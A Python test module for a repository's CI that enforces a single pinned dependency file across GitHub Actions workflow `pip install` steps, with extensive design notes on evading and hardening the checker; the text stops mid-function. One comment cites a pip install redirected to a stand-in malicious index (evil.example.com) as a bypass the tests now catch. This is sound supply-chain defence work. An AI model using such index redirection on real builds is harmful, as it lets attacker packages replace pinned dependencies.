#!/usr/bin/env python3
"""Every `pip install` in this repo's own CI YAML installs requirements-dev.txt.

Issue #121. The packages this repo tests itself with used to be pinned inline
in the `pip install` lines of .github/workflows/. Nothing required any two of
those lines to agree — at b81f6f1 some named different subsets of the set and
others restated the identical set — and nothing outside Actions could read the
set at all.
requirements-dev.txt is now the one place a version of any of them is written;
these tests are what makes that claim hold rather than describe the day it was
made.

The rule they enforce is deliberately shaped so it needs no list of its own:

  * every `pip install` a workflow runs must install `-r <requirements file>`,
    and that file must be the declared one;
  * it may name no package of its own, pinned or not — a name on the command
    line is a second place a version can live, or a dependency nobody
    declared;
  * it may pass only options that cannot change which version pip resolves,
    and the table of those is a whitelist, so an option this file has never
    heard of fails rather than being skipped;
  * and no `PIP_*` variable may be set around it except the environment twin
    of an option already on that whitelist — pip reads `PIP_<OPTION>` for
    every option it has, so `PIP_CONSTRAINT` is `-c` and `PIP_INDEX_URL` is
    `-i`, and the whitelist would have read the command line and missed them;
  * so a package added to requirements-dev.txt is covered the moment it is
    added, and nothing here has to be widened to notice it.

That cover runs one way only. A name the file declares that nothing in the
repo needs is not flagged by anything here; deciding a package is no longer
used takes reading the scripts, which these tests do not do.

FAIL-CLOSED IS THE POINT. A command these tests cannot place, or a pip install
that the YAML walk never reached, is a FAILURE naming the file, the job or
composite action, and the step index — not a silent pass. The whole failure mode being guarded is a
pin drifting back into a workflow unnoticed, and a checker that shrugs at a
shape it does not recognise would be the exact hole it was written to close.

A PIP INSTALL IS RECOGNISED BY TOKENS, NEVER BY A PREFIX. An earlier version of
this file matched a regex anchored to the start of a command, so it needed the
command to *begin* with `pip` or `python -m pip`. Any token in front of that
hid the install completely — `sudo python3 -m pip install`, `env FOO=1 pip
install`, `uv pip install`, `$PY -m pip install` — and `python3 -m pip -q
install` hid it by putting a global option between `pip` and `install`. A
recogniser that decides by matching a prefix loses to a longer prefix, every
time. So each `run:` body is tokenised as shell and split into commands, and a
command counts as a pip install whenever a token naming pip (`pip`, `pip3`,
`pip3.11`, a path ending in one, or the module of an attached `-mpip`) is
followed by the subcommand `install` — however many tokens sit in front of it
and whatever flags sit between. Where pip cannot be ruled out rather than
found — a token before `install` that only resolves at job time, or a Python
interpreter handed code mentioning pip — the command is reported instead.

A `run:` BODY IS NOT ALWAYS SHELL, and reading one that is not as if it were
is the same silent pass in a second costume. `shell: python` — a first-class
step key, and settable for a whole job or workflow through `defaults.run` —
makes the body Python, where an install is written
`subprocess.check_call([sys.executable, "-m", "pip", "install", "x"])`: no
`pip` token, no `install` token, nothing for a shell parser to find. A heredoc
does the same thing inside a bash step, since `python3 - <<PY` hands its body
to the interpreter on stdin. So the effective `shell:` is resolved before
anything is tokenised, a body in another language is reported rather than
parsed, and heredoc bodies are lifted out of the shell text and looked at as
what they are. All three heredocs these workflows use sit in bodies that also
run real commands, and one of those bodies runs a real install, so lifting a
heredoc out has to leave the shell around it readable.

`-r requirements-dev.txt` NAMES A RELATIVE PATH, and pip resolves it against
the step's directory rather than against this repo's root. `working-directory:`
is another step key the tokeniser never sees, settable through `defaults.run`
as well, and resolving the path from the root regardless said a step at
`tools/` was reading the declared file when it was reading
tools/requirements-dev.txt. So each install carries the directory it runs in,
the path is resolved from there, and a working directory that only resolves at
job time is reported. A `cd` in the body does the same thing with nothing in
the YAML to record it, so an install sharing a body with one is reported too —
in either order, because a token walk cannot say which side of the install the
`cd` runs on.

Parsed with `yaml`, not grepped: a `run:` body is a folded or literal scalar
whose indentation and continuations a line scan does not see, and these
workflows carry comments that contain the words `pip install` inside prose
about pip installs, so a line scan would report those and a commented-out
install as real commands. Tokenising drops a `#` comment and keeps a quoted
`"pip install ..."` as one token, so neither is mistaken for a command. The
stray-scalar test below is the second pair of eyes on the walk: it re-reads the
SAME parsed document as a tree of scalars, with no notion of what a job or a
step is, and fails when a pip install turns up in a scalar the step walk never
visited.

Scope is the YAML — the opening sentence means the YAML and not more. What a
step RUNS is read; what a script the step calls goes on to do is not, so
`bash scripts/setup-env.sh` is a place a pin could live that nothing here
looks at. Closing that needs a scanner for committed scripts rather than a
wider glob, and it is not written. The YAML this repo runs its own CI from is
.github/workflows/*.yml and the composite actions at
.github/actions/**/action.yml. A composite action's
`runs.steps[].run` is shell this repo's jobs execute exactly as a workflow step
is, so leaving it out would have left a place a pin could drift back into with
nothing looking. Skills SHIP workflow YAML as assets
(plugins/adam/skills/github-actions-repo-settings/assets/workflows/) that runs
in other people's repositories; their dependencies are not ours to pin, and
sweeping them in here would fail this repo's CI over a template.

Run: python3 -m pytest scripts/test_workflow_dependency_pins.py -q
"""

import re
import shlex
from pathlib import Path

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parent.parent
REQUIREMENTS = REPO_ROOT / "requirements-dev.txt"

# Characters shlex hands back as their own tokens rather than folding into a
# word. The shell's own command separators, plus `\n` — which shlex counts as
# whitespace by default, and which has to end a command here, because a `run:`
# body separates its commands by line as much as by `;`.
PUNCTUATION = "();<>|&\n"
# `{` and `}` are not shell operators, but a `{ ...; }` group puts them where a
# command begins and ends, and neither is ever the program being run.
BRACES = {"{", "}"}

# Cheap pre-filter, and a sound one: every rule below needs either the letters
# `pip` or the word `install` present, so nothing the scanner could have
# flagged is dropped here. It is ONLY a speed-up. It was briefly described as
# what keeps shlex away from prose, and it is not: `Install the runner's
# Python dependencies` is prose, gets past it on the word `install`, and then
# fails to tokenise on the apostrophe. What separates prose from shell is the
# `strict` argument to scan_shell_body below, not this.
PIP_HINT = re.compile(r"pip|install", re.IGNORECASE)

# A `run:` body is only shell if the step says so. `shell:` is a first-class
# step key, and `shell: python` makes the body Python — where
# `subprocess.check_call([sys.executable, "-m", "pip", "install", "x"])` has no
# `pip` token and no `install` token for any shell parser to find, so the
# tokeniser below read it as QUIET. These are the values whose body is a
# command line the tokeniser can read at all; `python`, and any custom
# `shell: <program> {0}` template, are a different language, so a body under
# one of those is reported rather than parsed. An ABSENT `shell:` is a command
# line: bash is the documented default everywhere but Windows, and pwsh writes
# an install with the same tokens.
COMMAND_LINE_SHELLS = frozenset({"bash", "sh", "pwsh", "powershell", "cmd"})

# Commands that move the directory pip resolves `-r` against. pip reads a
# requirements path relative to the process's cwd, so a `cd` in front of an
# install decides which requirements-dev.txt it reads — and which one this
# file should have checked.
DIRECTORY_CHANGERS = frozenset({"cd", "pushd", "popd"})

# A heredoc redirect and the word that ends it. The body in between is text
# handed to the command, not shell — `python3 - <<PY ... PY` is the same
# hole as `shell: python` written inside a bash step, and the tokeniser read
# the Python as more shell commands and found nothing.
HEREDOC = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")

# A token that names the pip program: `pip`, `pip3`, `pip3.11`, and the same
# reached by path. Deliberately a full match — `pipefail` and `pip_ok=no` both
# appear in this repo's workflows and neither is pip.
PIP_PROGRAM = re.compile(r"(?:[^\s]*/)?pip[0-9]*(?:\.[0-9]+)*")

# pip subcommands that install nothing, so a pin cannot drift in through one.
# A subcommand outside this set and not `install` is not waved through: it is
# reported as unplaceable, because the safe reading of a pip invocation this
# file does not understand is that it might install something.
PIP_SUBCOMMANDS_THAT_INSTALL_NOTHING = frozenset({
    "cache", "check", "completion", "config", "debug", "download", "freeze",
    "hash", "help", "index", "inspect", "list", "lock", "search", "show",
    "uninstall", "wheel",
})

# A token naming an interpreter that takes code as an argument. `sh -c
# '<code>'` and `python -c '<code>'` are shell's blind spot: the code arrives
# as one quoted token, so no `pip` token and no `install` token exist for any
# shell parser to find.
INTERPRETER = re.compile(
    r"(?:[^\s]*/)?(?:python[0-9]*(?:\.[0-9]+)*"
    r"|sh|bash|dash|zsh|ksh|fish|perl|ruby|node)")
# `pip` as a word, so `pipefail` and `pipeline` are not it. `set -o pipefail`
# is in this repo's workflows and `bash -c 'set -o pipefail; ...'` must not
# read as an install hidden in an argument.
PIP_WORD = re.compile(r"\bpip[0-9]*(?:\.[0-9]+)*\b")

# `NAME=value` in front of a command is an environment assignment, not the
# program being run.
ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=")
# A token whose value is decided at job time, not at test time.
UNRESOLVABLE = re.compile(r"[$`]")
# A program name this file can read at test time. Anything holding a `$`, a
# backtick or a glob resolves at job time to something unknown, so a command
# running `install` under one of those cannot be placed.
RESOLVABLE_PROGRAM = re.compile(r"[A-Za-z0-9_@.+:/=-]+")

# THE OPTION TABLE IS A WHITELIST, and the entry test for it is one question:
# can this option change WHICH VERSION pip ends up installing, or where it
# comes from? If it can, it does not belong here. An earlier version of this
# table listed options so their values would not be mistaken for package
# names, which meant `-c constraints.txt` was consumed and waved through —
# and a constraints file beats the requirements file, so `pyyaml==6.0.1` in
# constraints.txt overrides `pyyaml==6.0.3` in requirements-dev.txt. Measured
# on this branch at 2330e9c: `pip install -r requirements-dev.txt -c
# constraints.txt` and `--index-url https://evil.example.com/simple` both
# passed green. A whitelist fails an option it has never heard of, so a future
# pip option that redirects a pin has to be looked at by a person before it
# can be used here.
#
# Options with no value, none of which change what pip resolves — they change
# how loud it is, where it puts the result, or whether it reads config.
VERSION_NEUTRAL_FLAGS = frozenset({
    "-q", "-qq", "-qqq", "--quiet",
    "-v", "-vv", "-vvv", "--verbose",
    "--no-color", "--no-input", "--no-cache-dir", "--isolated",
    "--disable-pip-version-check", "--no-python-version-warning",
    "--no-warn-script-location", "--no-warn-conflicts",
    "--require-virtualenv", "--user", "--break-system-packages",
    "--force-reinstall",
})
# Options that consume the following token, and whose value is a path, a
# number or a display setting rather than anything pip resolves against.
VERSION_NEUTRAL_VALUE_OPTIONS = frozenset({
    "--progress-bar", "--cache-dir", "--log", "--retries", "--timeout",
})
# `-r` is the point of the whole file, so it is read rather than skipped: the
# file it names is checked against the declared one.
REQUIREMENT_OPTIONS = frozenset({"-r", "--requirement"})

# EVERY PIP OPTION HAS AN ENVIRONMENT TWIN, and the whitelist above only reads
# the command line. pip takes `PIP_<OPTION>` for any option it accepts, so
# `PIP_CONSTRAINT` is `-c`, `PIP_INDEX_URL` is `-i`, `PIP_EXTRA_INDEX_URL`,
# `PIP_FIND_LINKS` and `PIP_PRE` are the rest of the families the whitelist
# rejects — set one and the install reads requirements-dev.txt and resolves
# somewhere else. Measured here with pip 24.0:
# `PIP_CONSTRAINT=/nonexistent/nope.txt python3 -m pip install -r /dev/null`
# answers `ERROR: Could not open requirements file: [Errno 2] No such file or
# directory: '/nonexistent/nope.txt'` — a path no command line named.
#
# The allowed set is DERIVED from the option whitelist rather than written
# again, so the two cannot drift: an option that cannot change a version has
# an environment twin that cannot either, and one that is not on the whitelist
# has no twin here. A short option has no environment form of its own — pip
# names the variable after the long option — so only those are converted.
def pip_environment_name(option: str) -> str:
    """pip's environment variable for a long option: `--no-cache-dir` ->
    `PIP_NO_CACHE_DIR`."""
    return "PIP_" + option.lstrip("-").replace("-", "_").upper()


VERSION_NEUTRAL_PIP_ENV = frozenset(
    pip_environment_name(option)
    for option in VERSION_NEUTRAL_FLAGS | VERSION_NEUTRAL_VALUE_OPTIONS
    if option.startswith("--")
)

# `PIP_<NAME>=` at the start of a token. Catches the three shapes a shell has
# for setting one: the `NAME=value` prefix of a command, `export NAME=value`,
# and `echo "NAME=value" >> $GITHUB_ENV`, which sets it for every later step.
PIP_ENVIRONMENT_ASSIGNMENT = re.compile(r"(PIP_[A-Z0-9_]*)=")


def canonical(name: str) -> str:
    """PEP 503 normalisation, so `PyYAML`, `pyyaml` and `py_yaml` compare equal."""
    return re.sub(r"[-_.]+", "-", name).lower()


# A bare distribution name (PEP 508), and a version with nothing trailing it.
# Both halves are checked: `pytest-cov[toml]==7.0.0` used to be read as the
# name `pytest-cov[toml]` pinned to `7.0.0` and passed, even though an extra
# pulls in requirements this file does not name.
REQUIREMENT_NAME = re.compile(r"[A-Za-z0-9](?:[A-Za-z0-9._-]*[A-Za-z0-9])?")
REQUIREMENT_VERSION = re.compile(r"[0-9][0-9A-Za-z.+!-]*")


def parse_requirements(text: str, source: str = "requirements-dev.txt") -> dict:
    """{canonical name: version}, asserting the shape of every line it reads.

    Takes the text rather than reading the file so the shapes it rejects can
    be tested without writing into requirements-dev.txt.
    """
    declared = {}
    for lineno, raw in enumerate(text.splitlines(), start=1):
        line = raw.split("#", 1)[0].strip()
        if not line:
            continue
        assert "==" in line, (
            f"{source}:{lineno}: `{line}` is not an exact pin. "
            f"AGENTS.md requires `name==version`; a range or a bare name lets "
            f"CI resolve to whatever is newest at job time."
        )
        name, _, version = line.partition("==")
        name, version = name.strip(), version.strip()
        assert REQUIREMENT_NAME.fullmatch(name), (
            f"{source}:{lineno}: `{name}` is not a bare distribution name. An "
            f"extra (`pytest-cov[toml]`) installs requirements this file does "
            f"not name, so the set CI gets stops being the set written here."
        )
        key = canonical(name)
        assert key not in declared, (
            f"{source}:{lineno}: `{name}` is pinned twice, "
            f"so the file no longer states one version for it."
        )
        assert version, f"{source}:{lineno}: empty version."
        assert REQUIREMENT_VERSION.fullmatch(version), (
            f"{source}:{lineno}: `{name}` is pinned to `{version}`, which is "
            f"not a plain version. An environment marker or anything else "
            f"trailing the version makes what CI installs depend on the "
            f"runner rather than on this line."
        )
        declared[key] = version
    assert declared, f"{source} declares nothing."
    return declared


def declared_requirements() -> dict:
    """{canonical name: version} read out of requirements-dev.txt.

    Nothing in this file hardcodes what that set contains. A package added to
    the requirements file is part of the set these tests enforce as soon as it
    lands there.
    """
    return parse_requirements(REQUIREMENTS.read_text(encoding="utf-8"))


def governed_files(root=REPO_ROOT):
    """Every YAML file under .github/ whose `run:` bodies this repo executes.

    `root` is a parameter so the walk can be pointed at a fixture tree; the
    tests that check what it reaches would otherwise have to write into
    .github/ to say anything.
    """
    base = Path(root) / ".github"
    return sorted(
        set(base.glob("workflows/*.yml"))
        | set(base.glob("workflows/*.yaml"))
        | set(base.glob("actions/**/action.yml"))
        | set(base.glob("actions/**/action.yaml"))
    )


def join_continuations(body: str) -> str:
    """Fold `\\`-continued shell lines into one, so a command split across
    lines is one command to the scanner. account-skill-zips.yml's install is
    written that way."""
    return re.sub(r"\\\n[ \t]*", " ", body)


def runs_a_command_line(shell) -> bool:
    """Whether a step's `shell:` makes its `run:` body a command line.

    An absent `shell:` is one — bash is the documented default off Windows,
    and pwsh spells an install with the same tokens. `shell: python` and a
    custom `shell: <program> {0}` template are not.
    """
    if shell is None:
        return True
    first = str(shell).split()[:1]
    return bool(first) and first[0] in COMMAND_LINE_SHELLS


def split_heredocs(body: str):
    """(the shell text with heredoc bodies lifted out, [those bodies]).

    A heredoc body is not shell — it is text the command reads on stdin, and
    `python3 - <<PY` makes it a Python program. Leaving it in the token stream
    let `subprocess.check_call(["pip", "install", "x"])` parse as ordinary
    words in a command with no `pip` token and no `install` token, which is a
    silent pass. Two heredocs in these workflows are real, so they are lifted
    out and looked at as what they are rather than reported wholesale.

    The terminator is matched on the stripped line rather than at column 0.
    That is more generous than bash, and generous in the safe direction: it
    ends the heredoc sooner, so more text goes back to the scanner.
    """
    lines = body.split("\n")
    shell_lines, bodies = [], []
    index = 0
    while index < len(lines):
        line = lines[index]
        index += 1
        matches = list(HEREDOC.finditer(line))
        shell_lines.append(HEREDOC.sub(" ", line))
        for match in matches:
            delimiter = match.group(2)
            tabbed = match.group(0).startswith("<<-")
            collected = []
            while index < len(lines):
                candidate = lines[index]
                index += 1
                seen = candidate.lstrip("\t") if tabbed else candidate
                if seen.strip() == delimiter:
                    break
                collected.append(candidate)
            bodies.append("\n".join(collected))
    return "\n".join(shell_lines), bodies


def shell_tokens(body: str):
    """The shell tokens of one `run:` body, separators included.

    Quoting, escaping and `#` comments are shlex's job, which is the point:
    `echo "pip install x"` comes back as two tokens and the second is not
    `pip`, and a comment is gone before anything looks at it. Raises
    ValueError on text shlex cannot tokenise, e.g. an unbalanced quote.
    """
    lexer = shlex.shlex(join_continuations(body), posix=True,
                        punctuation_chars=PUNCTUATION)
    lexer.whitespace_split = True
    lexer.whitespace = " \t\r"  # `\n` is a separator here, not whitespace
    lexer.commenters = "#"
    return list(lexer)


def is_separator(token: str) -> bool:
    return token in BRACES or all(char in PUNCTUATION for char in token)


def shell_commands(tokens):
    """Split a token stream into one list of tokens per command."""
    command = []
    for token in tokens:
        if is_separator(token):
            if command:
                yield command
            command = []
        else:
            command.append(token)
    if command:
        yield command


def attached_module(token: str):
    """The module of an attached `-m<module>`, as in `python3 -mpip install`.

    Python accepts the module glued to the option, which makes `-mpip` a
    single token with no `pip` token anywhere in the command.
    """
    if token.startswith("-m") and not token.startswith("--") and len(token) > 2:
        return token[2:]
    return None


def command_program(tokens):
    """The program a command runs, past any `NAME=value` prefix."""
    for token in tokens:
        if ASSIGNMENT.match(token) or token.startswith("-"):
            continue
        return token
    return None


def classify_command(tokens):
    """('install', args) | ('other', None) | ('unplaceable', reason).

    `args` is the tokens after the `install` subcommand. Whatever sits in
    front of pip is ignored on purpose: a wrapper is how the anchored
    recogniser this replaced was defeated.
    """
    for index, token in enumerate(tokens):
        module = attached_module(token)
        if not PIP_PROGRAM.fullmatch(token) and not (
                module and PIP_PROGRAM.fullmatch(module)):
            continue
        rest = tokens[index + 1:]
        after_options = 0
        while (after_options < len(rest)
               and rest[after_options].startswith("-")):
            after_options += 1
        subcommand = rest[after_options] if after_options < len(rest) else None
        if subcommand == "install":
            return "install", rest[after_options + 1:]
        if subcommand in PIP_SUBCOMMANDS_THAT_INSTALL_NOTHING:
            return "other", None
        return "unplaceable", (
            f"`{token}` is pip, but the token after its flags is "
            f"{subcommand!r}, which is not a pip subcommand this file knows. "
            f"A pip command it cannot place might be an install, so it fails "
            f"rather than passing in silence. Note that a pip global option "
            f"taking a SEPARATE value (`pip --log f install ...`) lands here "
            f"too: only flags are skipped when looking for the subcommand."
        )
    if "install" in tokens:
        program = command_program(tokens)
        opaque = [token for token in tokens[:tokens.index("install")]
                  if UNRESOLVABLE.search(token) and not ASSIGNMENT.match(token)]
        if program is None or not RESOLVABLE_PROGRAM.fullmatch(program):
            return "unplaceable", (
                f"runs `install` under {program!r}, which does not resolve to "
                f"a program name until job time, so this file cannot tell "
                f"whether it is pip."
            )
        if opaque:
            return "unplaceable", (
                f"runs `install` with {opaque} in front of it, and those "
                f"resolve at job time, so one of them can be pip."
            )
    if (any(INTERPRETER.fullmatch(token) for token in tokens)
            and any(PIP_WORD.search(token) for token in tokens)):
        return "unplaceable", (
            "runs an interpreter over a token naming pip. `sh -c '<code>'` "
            "and `python -c '<code>'` pass their code as one quoted token, so "
            "a pip install inside it is not a shell command at all and "
            "nothing here can read it. Put the install in its own `run:` line."
        )
    return "other", None


def scan_shell_body(body: str, shell=None, strict: bool = True):
    """(pip install commands, unplaceable commands) for one step body.

    Each entry is (command text, ...) where the text is the command's tokens
    re-joined by shlex — a faithful, runnable rendering of what was parsed
    rather than a slice of the original, so a failure message shows what the
    checker actually saw.

    `shell` is the step's effective `shell:`. A body under a shell whose
    language is not a command line is not tokenised at all: it is reported,
    because reading Python as shell is what let a `shell: python` step install
    a drifted pin at exit 0.

    `strict` is what separates a step's `run:` body from every other scalar in
    a document. A `run:` body is shell this repo executes, so anything
    unreadable in it fails. Any other scalar is usually prose, and two things
    that are evidence in shell are not evidence there: text shlex cannot
    tokenise (an apostrophe is an unbalanced quote, and `Install the runner's
    Python dependencies` is a step name, not a broken command), and a `pip`
    token whose subcommand is an ordinary word rather than `install`. Dropping
    those hides nothing, because every `run:` body is read with strict=True by
    the step walk; what it stops is a rename reddening CI over a name.
    """
    if not PIP_HINT.search(body):
        return [], []
    if not runs_a_command_line(shell):
        return [], [(body.strip(), (
            f"runs under `shell: {shell}`, whose body is not a command line, "
            f"and it names pip or an install. Nothing here can read another "
            f"language, so it is reported rather than parsed as shell — "
            f"`subprocess.check_call([sys.executable, '-m', 'pip', "
            f"'install', ...])` has no `pip` token for any shell parser to "
            f"find. Put the install in its own `run:` step under bash."
        ))]
    text, heredocs = split_heredocs(body)
    found, unplaceable, changed_directory = [], [], []
    for heredoc in heredocs:
        if PIP_HINT.search(heredoc):
            unplaceable.append((heredoc.strip(), (
                "is a heredoc body naming pip or an install. A heredoc is "
                "text handed to a command on stdin, not shell, and this file "
                "cannot tell whether the command reading it is an interpreter "
                "that will run the install. Put the install in its own `run:` "
                "line, outside the heredoc."
            )))
    try:
        tokens = shell_tokens(text)
    except ValueError as exc:
        if not strict:
            return found, unplaceable
        return found, unplaceable + [
            (body.strip(), f"could not be tokenised as shell: {exc}")]
    for command in shell_commands(tokens):
        kind, payload = classify_command(command)
        text = shlex.join(command)
        if kind == "install":
            found.append((text, payload))
        elif kind == "unplaceable" and (strict or "install" in command):
            unplaceable.append((text, payload))
        if command_program(command) in DIRECTORY_CHANGERS:
            changed_directory.append(text)
    if found and changed_directory:
        unplaceable.append((changed_directory[0], (
            f"changes directory in a body that also runs a pip install, so "
            f"the directory pip resolves `-r <file>` against is not this "
            f"repo's root and this file cannot say which requirements file "
            f"the install reads. Every command in the body is checked, not "
            f"just the ones ahead of the install: which side of it a `cd` "
            f"lands on is not something a token walk can order. Run the "
            f"install from the root, or set `working-directory:` so the step "
            f"says where it runs."
        )))
    return found, unplaceable


def run_defaults(node):
    """A workflow's or a job's `defaults.run` mapping, or an empty one.

    `shell:` and `working-directory:` can be declared once for a whole job or
    a whole workflow instead of on the step, so a step read on its own says
    nothing about the language its body is in.
    """
    defaults = node.get("defaults") if isinstance(node, dict) else None
    run = defaults.get("run") if isinstance(defaults, dict) else None
    return run if isinstance(run, dict) else {}


def step_containers(doc):
    """(label, key path prefix, steps, defaults) per place a doc holds steps.

    A workflow keeps them under `jobs.<id>.steps`; a composite action keeps
    them under `runs.steps`. Both are shell this repo runs. `defaults` is the
    workflow's `defaults.run` overlaid with the job's, which is the order
    Actions resolves them in.
    """
    workflow_defaults = run_defaults(doc)
    for job_id, job in (doc.get("jobs") or {}).items():
        if isinstance(job, dict):
            yield (f"job `{job_id}`", f".jobs.{job_id}.steps", job.get("steps"),
                   {**workflow_defaults, **run_defaults(job)})
    runs = doc.get("runs")
    if isinstance(runs, dict):
        # A composite action has no `defaults:`; every step declares its own
        # `shell:`, which Actions requires.
        yield "composite action", ".runs.steps", runs.get("steps"), {}


def parsed_run_steps(root=REPO_ROOT):
    """(path, label, step index, name, run body, shell, working dir) per step."""
    for path in governed_files(root):
        doc = yaml.safe_load(path.read_text(encoding="utf-8"))
        if not isinstance(doc, dict):
            continue
        for label, _, steps, defaults in step_containers(doc):
            for index, step in enumerate(steps or []):
                if not isinstance(step, dict):
                    continue
                run = step.get("run")
                if isinstance(run, str):
                    shell = step.get("shell", defaults.get("shell"))
                    workdir = step.get("working-directory",
                                       defaults.get("working-directory"))
                    yield (path, label, index, step.get("name"), run, shell,
                           workdir)


def scan_workflows(root=REPO_ROOT):
    """(installs, unplaceable) over every governed step body under .github/.

    An install entry carries the step's effective working directory, because
    that — not this file's location — is what pip resolves `-r <file>`
    against.
    """
    found, unplaceable = [], []
    for path, label, index, name, body, shell, workdir in parsed_run_steps(root):
        where = (
            f"{path.relative_to(root).as_posix()} {label} "
            f"step {index}" + (f" ({name})" if name else "")
        )
        commands, strays = scan_shell_body(body, shell)
        found.extend((where, text, args, workdir or ".") for text, args in commands)
        unplaceable.extend((where, text, why) for text, why in strays)
        if commands and UNRESOLVABLE.search(str(workdir or ".")):
            unplaceable.append((where, body.strip(), (
                f"runs a pip install under `working-directory: {workdir}`, "
                f"which only resolves at job time, so this file cannot tell "
                f"which requirements file `-r` names."
            )))
    return found, unplaceable


def requirements_path_read_by(workdir: str, path: str) -> Path:
    """The file pip opens for `-r <path>` in a step running at `workdir`.

    pip resolves a requirements path against the process's cwd, and a step's
    cwd is its `working-directory:` — not the repo root this file lives in.
    """
    return (REPO_ROOT / workdir / path).resolve()


def install_operands(args):
    """(requirement files, package operands, rejected options) for one install.

    A rejected option is one that is not on the whitelist above, whether pip
    has it today or grows it tomorrow. Parsing does not try to guess whether
    such an option takes a value, so the token after it may land in the
    package list — which is why the package check defers to the option check
    on a command that has any.
    """
    requirement_files, packages, rejected = [], [], []
    skip_next = False
    for i, token in enumerate(args):
        if skip_next:
            skip_next = False
            continue
        name, equals, value = token.partition("=")
        if token.startswith("-r") and not token.startswith("--") and len(token) > 2:
            requirement_files.append(token[2:])
        elif name in REQUIREMENT_OPTIONS:
            if equals:
                requirement_files.append(value)
            elif i + 1 < len(args):
                requirement_files.append(args[i + 1])
                skip_next = True
            else:
                rejected.append(f"{token} (with no file after it)")
        elif name in VERSION_NEUTRAL_VALUE_OPTIONS:
            skip_next = not equals
        elif token in VERSION_NEUTRAL_FLAGS:
            continue
        elif token.startswith("-"):
            rejected.append(token)
        else:
            packages.append(token)
    return requirement_files, packages, rejected


ALL_INSTALLS, UNPLACEABLE = scan_workflows()
INSTALL_CASES = list(ALL_INSTALLS)
INSTALL_IDS = [where for where, _, _, _ in ALL_INSTALLS]


def test_the_workflows_install_python_dependencies_at_all():
    """Guards the vacuous pass for the checks parametrized over the installs
    found. With none found pytest generates no case for any of them: they
    report as skipped and cannot fail, so nothing would be checking the
    workflows at all. Measured by rewriting every workflow install to `true`,
    which leaves this assertion as the failure."""
    assert ALL_INSTALLS, (
        "no `pip install` was found under .github/. Either the jobs stopped "
        "installing their Python dependencies, or the scanner in this file no "
        "longer recognises how they do it — and the checks parametrized over "
        "the installs are skipped rather than failed either way, which is why "
        "this one exists."
    )


def test_no_workflow_command_that_might_be_a_pip_install_is_left_unplaced():
    """The fail-closed half of the recogniser.

    A command holding a pip token whose subcommand this file cannot name, or
    running `install` under a program that only resolves at job time, is
    reported here rather than skipped. Skipping it is how a drifted pin gets
    through: the checks below only see what the recogniser hands them.
    """
    assert not UNPLACEABLE, "\n".join(
        f"{where} runs a command this file cannot place:\n  {text}\n  {why}"
        for where, text, why in UNPLACEABLE
    )


@pytest.mark.parametrize("where, command, args, workdir", INSTALL_CASES,
                         ids=INSTALL_IDS)
def test_a_workflow_install_reads_the_declared_requirements_file(
        where, command, args, workdir):
    """`-r <path>` is resolved the way pip resolves it — against the step's
    working directory, not against this repo's root. A step carrying
    `working-directory: tools` reads tools/requirements-dev.txt, and resolving
    that path from the root instead said it read the declared file."""
    files, _, _ = install_operands(args)
    assert files, (
        f"{where} runs `{command}` without `-r`. Every workflow install has "
        f"to read requirements-dev.txt so the version it gets is the declared "
        f"one; installing anything by name here is a second place a pin can "
        f"live and drift."
    )
    expected = REQUIREMENTS.relative_to(REPO_ROOT).as_posix()
    for path in files:
        resolved = requirements_path_read_by(workdir, path)
        where_from = "" if workdir == "." else (
            f" from `working-directory: {workdir}`, i.e. "
            f"`{(Path(workdir) / path).as_posix()}`,")
        assert resolved == REQUIREMENTS, (
            f"{where} installs `-r {path}`{where_from} which is not the "
            f"declared dependency set at {expected}. A second requirements "
            f"file is a second place a version is written down."
        )


@pytest.mark.parametrize("where, command, args, workdir", INSTALL_CASES,
                         ids=INSTALL_IDS)
def test_a_workflow_install_uses_no_option_that_can_change_the_version(
        where, command, args, workdir):
    """`-r requirements-dev.txt` only states the pins; several pip options
    override them. A constraints file wins over a requirements file, and an
    index option moves where every pin resolves from, so an install carrying
    one of those reads the declared set and installs something else."""
    _, _, rejected = install_operands(args)
    assert not rejected, (
        f"{where} runs `{command}`, which passes {rejected} — not on the "
        f"whitelist of options that cannot change which version pip installs. "
        f"A constraints file overrides the requirements pin and an index "
        f"option moves where it resolves from, so an option here can undo "
        f"requirements-dev.txt without changing a line of it. If the option "
        f"genuinely cannot change the resolved version, add it to "
        f"VERSION_NEUTRAL_FLAGS or VERSION_NEUTRAL_VALUE_OPTIONS and say why."
    )


@pytest.mark.parametrize("where, command, args, workdir", INSTALL_CASES,
                         ids=INSTALL_IDS)
def test_a_workflow_install_names_no_package_of_its_own(where, command, args, workdir):
    """The drift check proper, and the one that reads the declared set.

    A package named on a workflow's command line is measured against
    requirements-dev.txt rather than against a list kept here, so this fails
    the same way whether the workflow disagrees with the file, duplicates it,
    or installs something the file has never heard of.
    """
    _, packages, rejected = install_operands(args)
    if not packages or rejected:
        # An option the whitelist rejects may swallow the token after it, so a
        # bare token here can be that value rather than a package. The options
        # check is the one that reports such a command.
        return
    declared = declared_requirements()
    detail = []
    for spec in packages:
        name, sep, version = spec.partition("==")
        key = canonical(name.strip())
        if key not in declared:
            detail.append(
                f"`{spec}` is not in requirements-dev.txt at all — a "
                f"dependency this workflow needs that the declared set does "
                f"not mention")
        elif not sep:
            detail.append(
                f"`{spec}` is unpinned here while requirements-dev.txt pins "
                f"it to {declared[key]}, so this job can resolve to a "
                f"different version than the rest of CI")
        elif version.strip() != declared[key]:
            detail.append(
                f"`{spec}` DISAGREES with requirements-dev.txt, which pins "
                f"{name.strip()}=={declared[key]}")
        else:
            detail.append(
                f"`{spec}` restates the pin in requirements-dev.txt — it "
                f"agrees today, and it is the copy that drifts tomorrow")
    raise AssertionError(
        f"{where} names packages on its own command line:\n  " + command
        + "\n" + "\n".join("  - " + d for d in detail)
        + "\nInstall them by adding them to requirements-dev.txt and using "
          "`-r requirements-dev.txt` alone."
    )


def env_mappings(node, path=""):
    """(key path, variable name) for every key of every `env:` mapping.

    Walks the whole document rather than the three levels Actions defines one
    at today, so a workflow `env:`, a job's, a step's and anything a future
    Actions feature adds all arrive here. The stray-scalar walk cannot see
    these: it reads scalar VALUES, and `PIP_CONSTRAINT: drift.txt` hides in
    the KEY.
    """
    if isinstance(node, dict):
        for key, value in node.items():
            if key == "env" and isinstance(value, dict):
                for name in value:
                    yield f"{path}.env.{name}", str(name)
            yield from env_mappings(value, f"{path}.{key}")
    elif isinstance(node, list):
        for index, value in enumerate(node):
            yield from env_mappings(value, f"{path}[{index}]")


def pip_environment(root=REPO_ROOT):
